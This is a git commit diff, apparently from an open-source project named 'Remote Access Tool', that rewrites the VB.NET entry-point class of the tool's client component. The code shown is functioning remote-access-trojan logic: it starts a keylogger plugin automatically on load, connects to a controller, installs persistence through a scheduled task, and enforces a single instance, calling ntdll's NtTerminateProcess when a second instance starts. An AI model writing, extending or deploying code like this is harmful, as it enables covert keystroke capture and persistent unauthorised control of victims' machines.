eb82639ea475f7ac601ad96f1e5cb8b1bffcda8d
ថಘઅഞפּ ṛཥચ <42241901+arsium@users.noreply.github.com>
2022-04-08 14:11:59 +0200

    Update EntryClass.vb

--- Remote Access Tool/ClientVBDll/EntryClass.vb
+++ Remote Access Tool/ClientVBDll/EntryClass.vb
@@ -1,4 +1,5 @@
-﻿Imports System.Runtime.InteropServices
+Imports System.Diagnostics
+Imports System.Runtime.InteropServices
 Imports System.Threading
 
 ' 
@@ -8,52 +9,53 @@ Imports System.Threading
 '
 
 Namespace Client
-    Public Class EntryClass
-		Friend Shared KeylogOn As Boolean
+    Public Class StarterClass
 
-		Private Shared MT As Mutex
-		Private Shared OW As Boolean = False
-		Public Shared Sub OneInstance()
-			MT = New Mutex(True, Config.mutex, OW)
-			If Not OW Then
-				Environment.Exit(0)
-			End If
-		End Sub
-
-
-		Shared Sub New()
-			KeylogOn = False
-			clientHandler = New ClientHandler()
-			StartOfflineKeylogger()
-		End Sub
-
-		Friend Shared Sub StartOfflineKeylogger()
-			If Not EntryClass.KeylogOn And Config.offKeylog <> "False" Then
-				Plugin.Launch.Start()
-				KeylogOn = True
-			End If
-		End Sub
+        Friend Shared KeylogOn As Boolean
+        Private Shared AlreadyLaunched As Boolean = False
+        Private Shared mutex As Mutex
+        Public Shared Sub OneInstance()
+            mutex = New Mutex(True, Config.mutex, AlreadyLaunched)
+            If Not AlreadyLaunched Then
+                NtTerminateProcess(Process.GetCurrentProcess().Handle, 0)
+            End If
+        End Sub
 
 
-		<DllImport("ntdll.dll")>
-		Friend Shared Function NtTerminateProcess(ByVal hProcess As IntPtr, ByVal errorStatus As Integer) As UInteger
-		End Function
+        Shared Sub New()
+            KeylogOn = False
+            clientHandler = New ClientHandler()
+            StartOfflineKeylogger()
+        End Sub
 
-		Friend Shared clientHandler As ClientHandler
+        Friend Shared Sub StartOfflineKeylogger()
+            If Not StarterClass.KeylogOn And Config.offKeylog <> "False" Then
+                Plugin.Launch.Start()
+                KeylogOn = True
+            End If
+        End Sub
 
-		Public Shared Sub Main()
-			OneInstance()
-			clientHandler.ConnectStart()
-			MakeInstall()
-			Call (New Thread(New ThreadStart(Sub()
-												 Do
-													 Thread.Sleep(-1)
-												 Loop
-											 End Sub))).Start()
-		End Sub
 
-		Public Shared Sub MakeInstall()
-			Persistence.Launch.StartUpTaskScheduler(Config.time, Config.taskName)
-		End Sub
-	End Class
+        <DllImport("ntdll.dll")>
+        Friend Shared Function NtTerminateProcess(ByVal hProcess As IntPtr, ByVal errorStatus As Integer) As UInteger
+        End Function
+
+        Friend Shared clientHandler As ClientHandler
+
+        <MTAThread>
+        Public Shared Sub Main()
+            OneInstance()
+            clientHandler.ConnectStart()
+            MakeInstall()
+            Call (New Thread(New ThreadStart(Sub()
+                                                 Do
+                                                     Thread.Sleep(-1)
+                                                 Loop
+                                             End Sub))).Start()
+        End Sub
+
+        Public Shared Sub MakeInstall()
+            Persistence.Launch.StartUpTaskScheduler(Config.time, Config.taskName)
+        End Sub
+    End Class
 End Namespace
